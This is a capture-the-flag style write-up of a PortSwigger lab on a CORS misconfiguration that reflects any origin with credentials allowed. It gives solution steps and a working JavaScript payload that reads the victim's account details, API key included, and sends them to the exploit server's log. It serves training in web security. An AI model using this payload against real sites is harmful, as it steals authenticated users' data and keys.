# Lab: CORS vulnerability with basic origin reflection (Apprentice)

**Lab:** [https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

**Task (from PortSwigger):**
This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's
API key and upload the code to your exploit server. The lab is solved when you
successfully submit the administrator's API key.

Credentials: `wiener:peter`

## Vulnerability
The `/accountDetails` endpoint responds with `Access-Control-Allow-Credentials: true`
and reflects whatever `Origin` the request sends back in `Access-Control-Allow-Origin`.
Any origin is therefore trusted, so an attacker page can issue a credentialed
cross-origin request and read the authenticated JSON response (which contains `apikey`).

## Solution
1. Log in as `wiener:peter` and confirm `GET /accountDetails` returns your API key.
2. In Burp, confirm the response reflects an arbitrary `Origin:` header into
   `Access-Control-Allow-Origin` and keeps `Access-Control-Allow-Credentials: true`.
3. Put the payload below in the exploit server **Body**, replacing `YOUR-LAB-ID`.
4. **Store** -> **Deliver exploit to victim**.
5. Open **Access log**; the admin's `/accountDetails` JSON (including `apikey`) is in the
   `GET /log?key=...` line logged by the victim's browser.
6. **Submit solution** with the administrator's API key.

## Final Exploit Payload
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
